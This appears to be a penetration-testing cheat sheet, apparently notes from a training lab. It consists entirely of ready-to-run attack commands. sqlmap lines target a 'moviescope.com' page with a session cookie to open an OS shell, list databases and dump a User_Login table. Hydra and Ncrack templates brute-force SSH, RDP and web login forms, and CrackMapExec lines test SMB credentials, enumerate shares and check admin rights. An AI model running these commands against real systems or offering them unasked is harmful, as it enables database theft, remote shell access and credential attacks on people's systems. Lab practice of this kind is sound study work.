#SQLMAP
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump 

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs 
##nfs mount commands

# ========================
# 🔐 HYDRA CHEATSHEET
# ========================

# 📌 Basic Syntax:
hydra [options] -L userlist -P passlist service://target
hydra [options] -l user -P passlist service://target

# ✅ Single Username:
hydra -l admin -P passwords.txt ssh://192.168.1.10

# ✅ User List:
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# 🔄 Supported Modules:
# ssh, ftp, http-get, http-post, rdp, smb, vnc, telnet, mysql

# 🔸 HTTP GET Form:
hydra -l admin -P passwords.txt 192.168.1.10 http-get-form "/login.php:username=^USER^&password=^PASS^:F=Incorrect"

# 🔸 HTTP POST Form:
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# Notes:
# - F= string to detect failure
# - S= string to detect success (optional)

# ========================
# 💥 NCRACK CHEATSHEET
# ========================

# 📌 Basic Syntax:
ncrack -p [service] -u [user] -P [passlist] [target]

# ✅ Single Username:
ncrack -p ssh -u admin -P passwords.txt 192.168.1.10

# ✅ User List:
ncrack -p ssh --userfile users.txt --passfile passwords.txt 192.168.1.10

# 🔄 Supported Services:
# ssh, ftp, rdp, http, smb, mysql, telnet

# ================================
# 🎯 CRACKMAPEXEC (CME) CHEATSHEET
# ================================

# ✅ Single Username:
crackmapexec smb 192.168.1.10 -u admin -p password123

# ✅ User List:
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt

# 🔍 Enumerate SMB Shares:
crackmapexec smb 192.168.1.10 -u admin -p password123 --shares

# 🔐 Check Admin Access:
crackmapexec smb 192.168.1.10 -u admin -p password123 --admin-check

# 🧠 Notes:
# - Supports WinRM, RDP, SMB, MSSQL, etc.
# - CME is useful for post-exploitation AD enumeration
